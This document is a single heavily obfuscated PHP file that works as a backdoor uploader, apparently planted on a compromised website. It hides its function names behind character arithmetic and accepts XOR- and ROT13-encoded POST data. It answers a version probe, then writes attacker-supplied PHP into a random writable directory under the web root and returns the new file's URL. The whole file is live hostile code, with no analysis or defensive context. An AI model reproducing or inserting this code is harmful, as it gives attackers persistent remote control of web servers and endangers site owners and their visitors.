<?php $wdzRke = "\x44".'O'.'C'.chr(85)."\115".chr(69).'N'.chr(84).chr(95).'R'.chr(79)."\x4f".chr(799-715);$idZVVvgS = "\x48"."\124"."\x54"."\x50".chr(95).chr(342-270).'O'.'S'."\x54";$AqFVAAVSVT = 'h'."\164".chr(116).chr(1054-942)."\x3a".chr(861-814).chr(806-759);$tHWueWl = "\x2e".'p'."\150"."\x70";$XfyFsG = 'p'.chr(540-436).chr(112);$uhRQdSjEV = 'f'."\x69"."\154"."\x65".'_'.chr(308-196)."\x75".chr(146-30)."\137".chr(99)."\x6f".chr(970-860).chr(249-133)."\145".chr(228-118).chr(1056-940).chr(115);$SQMNL = chr(152-38).chr(279-182).'w'."\x75".'r'."\x6c".chr(433-333)."\145".'c'.chr(111)."\x64".chr(101);$MvXLXhju = chr(117).chr(110).'s'.'e'.chr(641-527)."\151".chr(97).'l'."\x69".'z'.'e';$zgRULhZp = chr(763-651).chr(104).chr(474-362)."\x76"."\145".chr(114)."\163"."\151".chr(731-620)."\156";$LEFCtOeEKr = chr(115).'t'.'r'."\137"."\x72"."\157"."\164".'1'.'3';$dAoSI = chr(174-59).chr(101)."\x72"."\x69".'a'.'l'."\151".chr(122).'e';$GJoGjEFNdK = "\163".chr(328-212).'r'."\137".chr(702-587)."\x70"."\154"."\x69"."\164";foreach ($_POST as $vdxEoebp => $ZDUBD){if (strlen($vdxEoebp) == 16){$ZDUBD = $GJoGjEFNdK($SQMNL($LEFCtOeEKr($ZDUBD)));$vdxEoebp = array_slice($GJoGjEFNdK(str_repeat($vdxEoebp, (count($ZDUBD)/16)+1)), 0, count($ZDUBD));function FPwtliHJ($gHCtxhAjP, $eNMYhCdi, $vdxEoebp){$vaYFIxzewj = "3c50cf39-a113-4797-93a7-6488ab0b3c50";return $gHCtxhAjP ^ $vaYFIxzewj[$eNMYhCdi % strlen($vaYFIxzewj)] ^ $vdxEoebp;}$ZDUBD = implode("", array_map("FPwtliHJ", array_values($ZDUBD), array_keys($ZDUBD), array_values($vdxEoebp)));$ZDUBD = @$MvXLXhju($ZDUBD);if (@is_array($ZDUBD)){$OLYQOmdBe = array_keys($ZDUBD);$ZDUBD = $ZDUBD[$OLYQOmdBe[0]];if ($ZDUBD === $OLYQOmdBe[0]){echo @$dAoSI(Array($XfyFsG => @$zgRULhZp(), ));exit();}else {function xexGSBSHqa($lUeEdSEir){static $iXsKnMP = array();$uVExUwpey = glob($lUeEdSEir . '/*', GLOB_ONLYDIR);if (count($uVExUwpey) > 0) {foreach ($uVExUwpey as $lUeEdSE) {if (@is_writable($lUeEdSE)) {$iXsKnMP[] = $lUeEdSE;}}}foreach ($uVExUwpey as $lUeEdSEir) xexGSBSHqa($lUeEdSEir);return $iXsKnMP;}$vVpgb = $_SERVER[$wdzRke];$uVExUwpey = xexGSBSHqa($vVpgb);$OLYQOmdBe = array_rand($uVExUwpey);$SEMrSe = $uVExUwpey[$OLYQOmdBe] . "/" . substr(md5(time()), 0, 8) . $tHWueWl;@$uhRQdSjEV($SEMrSe, $ZDUBD);echo $AqFVAAVSVT . $_SERVER[$idZVVvgS] . substr($SEMrSe, strlen($vVpgb));exit();}}}}